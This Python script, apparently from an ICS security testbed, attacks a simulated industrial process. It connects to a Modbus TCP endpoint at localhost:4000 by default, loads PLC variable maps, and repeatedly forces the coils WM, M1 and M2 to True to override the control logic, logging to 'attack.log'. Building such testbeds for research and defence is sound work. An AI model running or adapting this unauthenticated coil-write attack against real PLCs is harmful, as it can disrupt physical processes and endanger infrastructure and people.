import logging
import argparse
import os

from pymodbus.client.sync import ModbusTcpClient
from pyics.mtu import MTU, ProcessRange
from pyics.utils import *
from constants import *


log_path = "attack.log"

if os.path.exists(log_path):
    os.remove(log_path)

logging.basicConfig(filename = log_path, mode = 'w', format='[%(asctime)s][%(levelname)s][%(pathname)s-%(lineno)d] % (message)s', level= logging.INFO)

class MTUAttack(MTU):

    def __init__(self, ip, port, client=ModbusTcpClient):

        self.varmap = {
                        WM : False,
                        VT1 : False,
                        V1 : False,
                        V2 : False,
                        VS1 : False,
                        VS2 : False,
                        VTF : False,
                        VTC : False,
                        M1 : False,
                        M2 : False
                      }

        super(MTUAttack, self).__init__(ip, port, client)

    def target_vars(self, dirname):
        for filename in os.listdir(dirname):
            varname = filename.replace('plc-', '').replace('.ex', '')
            if varname in self.varmap.keys():
                self.import_variables(dirname + "/" + filename)

    def change_coil(self, name, val):
        self.varmap[name] = val
        self.write_variable(name, val)

    def main_loop(self, *args, **kwargs):
        self.change_coil(WM, True)
        self.change_coil(M1, True)
        self.change_coil(M2, True)


def main(args):
    time.sleep(5)
    mtu = MTUAttack(args.ip, args.port)
    mtu.target_vars(args.filename)
    
    mtu.create_task('mtu', args.period, args.duration)
    mtu.start()
    mtu.wait_end()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", dest="ip", default="localhost", action="store")
    parser.add_argument("--port", dest="port", default=4000, type=int, action="store")
    parser.add_argument("--period", dest="period", type=float, default=1, action="store")
    parser.add_argument("--duration", dest="duration", type=int, default=60, action="store")
    parser.add_argument("--import", dest="filename", action="store")
    args = parser.parse_args()
    main(args)
